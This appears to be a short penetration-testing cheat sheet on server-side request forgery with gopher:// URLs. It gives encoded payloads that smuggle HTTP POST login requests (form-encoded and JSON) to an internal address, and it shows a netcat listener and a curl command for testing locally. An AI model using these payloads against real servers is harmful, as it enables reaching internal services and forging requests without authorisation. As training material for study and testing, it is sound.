# SSRF with gopher

Curl  supports the Gopher protocol.  We can use Gopher URLs to create valid requests in several different protocols, including HTTP.

### application/x-www-form-urlencoded
```bash
gopher://10.10.10.3:80/_POST%20/login%20HTTP/1.1%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2041%0a%0ausername%3dwhite.rabbit%26password%3ddontbelate
```

### application json
```bash
gopher://10.10.10.3:80/_POST%20/login%20HTTP/1.1%0aContent-Length:%2051%0aContent-Type:%20application/json%0a%0a%7b%22username%22%3d%22white%2erabbit%22%2c%22password%22%3d%22dontbelate%22%7d
```

Test on local machine:
```bash
nc -nvlp 9000
```

```bash
curl gopher://127.0.0.1:9000/_POST%20/login%20HTTP/1.1%0aContent-Length:%2051%0aContent-Type:%20application/json%0a%0a%7b%22username%22%3d%22white%2erabbit%22%2c%22password%22%3d%22dontbelate%22%7d
```


```
ðŸ’¡ If we were to replicate this attack from curl or in the Repeater tool of Burp Suite, we would need to double encode any non-alphanumeric characters as well.
